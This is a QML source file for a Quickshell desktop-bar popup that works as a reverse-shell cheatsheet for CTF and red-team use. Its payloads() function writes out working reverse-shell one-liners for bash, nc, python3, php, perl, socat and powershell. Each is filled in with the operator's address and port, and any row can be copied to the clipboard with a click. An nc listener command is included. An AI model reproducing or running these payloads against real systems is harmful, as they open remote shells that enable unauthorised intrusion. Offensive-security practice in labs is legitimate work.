import QtQuick
import QtQuick.Layouts
import Quickshell
import ".."

// Reverse-shell cheatsheet: pre-fills every common payload with NetState's
// address (VPN/tun takes priority - the address that actually matters on a
// CTF box) and an editable port. Click any row to copy it. This is the
// "useful for a red team op" feature the theme swap was in service of.
PopupWindow {
    id: popup
    property var anchorWindow

    anchor.window: anchorWindow
    // Position centered under the button that opened it, clamped on-screen.
    anchor.rect.x: {
        const bw = anchorWindow ? anchorWindow.width : 1920;
        return Math.max(5, Math.min(bw - implicitWidth - 5, Popups.anchorX - implicitWidth / 2));
    }
    anchor.rect.y: -implicitHeight - 6

    implicitWidth: 480
    implicitHeight: content.implicitHeight + 20
    color: "transparent"
    property bool shown: RevShellState.visible
    // Stay mapped through the close animation so the exit fade can play.
    visible: shown || card.opacity > 0.01

    readonly property string ip: NetState.addr
    readonly property int port: NetState.port

    function payloads() {
        return [
            { label: "listener (run locally first)", cmd: "nc -lvnp " + port },
            { label: "bash", cmd: "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1" },
            { label: "nc -e", cmd: "nc -e /bin/sh " + ip + " " + port },
            { label: "python3", cmd: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'` },
            { label: "php", cmd: `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'` },
            { label: "perl", cmd: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'` },
            { label: "socat", cmd: "socat TCP:" + ip + ":" + port + " EXEC:/bin/sh" },
            { label: "powershell", cmd: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS>';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` },
        ];
    }

    Rectangle {
        id: card
        anchors.fill: parent
        radius: 6
        color: Colors.badgeBlack
        border.color: Colors.badgeGrey
        border.width: 1
        // Slide up out of the bar on open, back down into it on close, with a fade.
        opacity: popup.shown ? 1 : 0
        Behavior on opacity { NumberAnimation { duration: 180; easing.type: Easing.OutCubic } }
        transform: Translate {
            y: popup.shown ? 0 : 28
            Behavior on y { NumberAnimation { duration: 180; easing.type: Easing.OutCubic } }
        }

        ColumnLayout {
            id: content
            anchors.fill: parent
            anchors.margins: 10
            spacing: 6

            RowLayout {
                Layout.fillWidth: true

                Text {
                    text: "revshell"
                    color: Colors.badgeRed
                    font.family: "Iosevka"
                    font.pointSize: 9
                    font.bold: true
                    renderType: Text.NativeRendering
                }

                Item { Layout.fillWidth: true }

                Text {
                    text: popup.ip
                    color: NetState.isVpn ? Colors.badgeGreen : Colors.badgeBlue
                    font.family: "Iosevka"
                    font.pointSize: 9
                    renderType: Text.NativeRendering
                }

                Text {
                    text: ":"
                    color: Colors.badgeWhite
                    font.family: "Iosevka"
                    font.pointSize: 9
                    renderType: Text.NativeRendering
                }

                TextInput {
                    text: NetState.port.toString()
                    color: Colors.badgeWhite
                    font.family: "Iosevka"
                    font.pointSize: 9
                    renderType: TextInput.NativeRendering
                    validator: IntValidator { bottom: 1; top: 65535 }
                    Layout.preferredWidth: 40
                    onEditingFinished: NetState.port = parseInt(text) || 4444
                }
            }

            Rectangle {
                Layout.fillWidth: true
                height: 1
                color: Colors.badgeGrey
            }

            Repeater {
                model: popup.payloads()

                delegate: ColumnLayout {
                    id: row
                    required property var modelData
                    Layout.fillWidth: true
                    spacing: 1
                    property bool copied: false

                    Text {
                        text: row.modelData.label
                        color: Colors.badgeWhite
                        font.family: "Iosevka"
                        font.pointSize: 7
                        renderType: Text.NativeRendering
                    }

                    Rectangle {
                        Layout.fillWidth: true
                        implicitHeight: cmdText.implicitHeight + 6
                        radius: 3
                        color: ma.containsMouse ? Colors.badgeGrey : "transparent"

                        Text {
                            id: cmdText
                            anchors.left: parent.left
                            anchors.right: parent.right
                            anchors.verticalCenter: parent.verticalCenter
                            anchors.margins: 4
                            text: row.copied ? "copied!" : row.modelData.cmd
                            color: row.copied ? Colors.badgeGreen : Colors.badgeBlue
                            wrapMode: Text.Wrap
                            font.family: "Iosevka"
                            font.pointSize: 8
                            renderType: Text.NativeRendering
                        }

                        MouseArea {
                            id: ma
                            anchors.fill: parent
                            hoverEnabled: true
                            cursorShape: Qt.PointingHandCursor
                            onClicked: {
                                Quickshell.clipboardText = row.modelData.cmd;
                                row.copied = true;
                                resetTimer.restart();
                            }
                        }

                        Timer {
                            id: resetTimer
                            interval: 1000
                            onTriggered: row.copied = false
                        }
                    }
                }
            }
        }
    }
}
